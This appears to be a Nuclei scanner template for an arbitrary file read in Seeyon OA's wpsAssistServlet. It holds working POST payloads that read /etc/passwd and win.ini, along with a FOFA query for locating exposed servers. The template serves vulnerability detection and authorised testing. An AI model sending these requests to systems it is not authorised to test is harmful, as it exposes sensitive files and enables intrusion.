id: seeyon-wpsAssistServlet-fileread-2

info:
  name: Seeyon OA wpsAssistServlet - Arbitrary File Read
  author: leadlife
  severity: high
  description: There is an arbitrary file read vulnerability in the Seeyon OA wpsAssistServlet interface.
  reference:
    - https://avd.aliyun.com/detail?id=AVD-2023-1700012
  metadata:
    verified: false
    fofa-query: app="致远互联-OA" || title="V8.0SP2" || body="seeyon/index.jsp"
  tags: seeyon,oa,fileread

http:
  - raw:
      - | # windows
        POST /seeyon/wpsAssistServlet HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
        Content-Length: 47
        Content-Type: application/x-www-form-urlencoded

        flag=template&templateUrl=C:/windows/win.ini

      - | #linux
        POST /seeyon/wpsAssistServlet HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
        Content-Length: 47
        Content-Type: application/x-www-form-urlencoded

        flag=template&templateUrl=/etc/passwd
    
    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or
